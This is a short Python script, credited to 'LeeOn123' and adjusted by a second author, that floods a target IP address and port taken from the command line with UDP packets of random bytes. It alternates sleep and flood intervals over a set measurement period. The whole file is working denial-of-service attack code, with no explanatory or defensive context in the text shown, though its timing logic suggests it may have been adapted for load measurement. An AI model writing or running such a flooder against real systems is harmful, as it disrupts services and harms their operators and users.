#!/usr/bin/env python3
#Code by LeeOn123, adjusted by Jesse Rengers
import random
import socket
import time
import sys

ip = str(sys.argv[1])
port = int(sys.argv[2])
packet_size = int(sys.argv[3])
measureDuration = int(sys.argv[4])
floodDuration = int(sys.argv[5])

def flood(partial_duration):
    data = random._urandom(packet_size)
    startTime = time.time()
    i = 0
    while True:
        if time.time() > startTime + partial_duration:
            break
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            s.sendto(data,addr)
            i += 1
        except:
            print("[!] Error!!!")
            sys.stdout.flush()

def run():
    runs = int((measureDuration/floodDuration)/2)
    for x in range(runs):
        time.sleep(floodDuration)
        flood(floodDuration)

run()